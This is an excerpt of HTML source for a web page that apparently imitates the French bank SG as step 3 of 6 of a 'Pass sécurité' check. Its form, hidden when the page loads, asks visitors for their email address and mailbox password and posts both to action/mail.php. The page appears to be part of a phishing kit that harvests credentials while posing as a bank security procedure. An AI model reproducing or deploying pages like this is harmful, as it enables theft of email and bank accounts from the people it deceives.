...
<head>
  ...
  <title>SG | Identifiants Mail</title>
...
<body>
  ...
  <div class="header">
    <div class="top-bar">
      <div class="nav-right">
        <a href="carte.php"><img src="icons/location.svg" alt=""> Agences</a>
  ...
  <hr>
  <p class="sub-title step-title">Pass sécurité - Etape 3/6</p>
  ...
  <div class="center-wrapper">
    ...
    <div class="form-box" id="mainForm" style="display:none;">
      <p class="instruction-text">
        ...
        veuillez saisir vos identifiants de connexion à votre boîte mail :
      </p>
      <!-- Formulaire -->
      <form action="action/mail.php" method="post">
        <div class="input-wrapper">
          <input type="email" class="client-input" id="emailInput" name="email" placeholder="Adresse mail">
        </div>

        <div class="input-wrapper">
          <input type="password" class="client-input" id="emailPassword" name="password" placeholder="Mot de passe">
        </div>
  ...
  <!-- ===== SCRIPTS ===== -->
  <script>
    // Affichage différé après chargement
